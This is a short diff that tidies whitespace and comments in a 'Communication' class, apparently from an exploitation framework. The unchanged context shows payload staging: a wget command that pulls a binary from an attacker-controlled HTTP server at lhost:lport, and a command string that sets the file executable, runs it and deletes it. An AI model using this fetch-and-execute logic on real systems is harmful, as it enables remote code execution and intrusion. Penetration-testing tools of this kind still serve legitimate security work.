@@ -167,10 +167,7 @@ class Communication(object):
         # name of the binary - its random 8 bytes
         self.binary_name = None
 
-        # is port used 
         self.port_used = False
-
-        # mutex
         self.mutex = False
 
     def http_server(self, lhost, lport):
@@ -207,8 +204,8 @@ class Communication(object):
 
         if self.port_used:
             print_error("Could not set up HTTP Server on {}:{}".format(self.options['lhost'], self.options['lport']))
-            return 
-            
+            return
+
         # wget binary
         print_status("Using wget to download binary")
         cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
@@ -294,7 +291,7 @@ class Communication(object):
         # default way of exectuign payload
         else:
             exec_binary_str = "chmod 777 {0}; {0}; rm {0}".format(path)
-            commands.append(exec_binary_str) 
+            commands.append(exec_binary_str)
 
         return commands
 
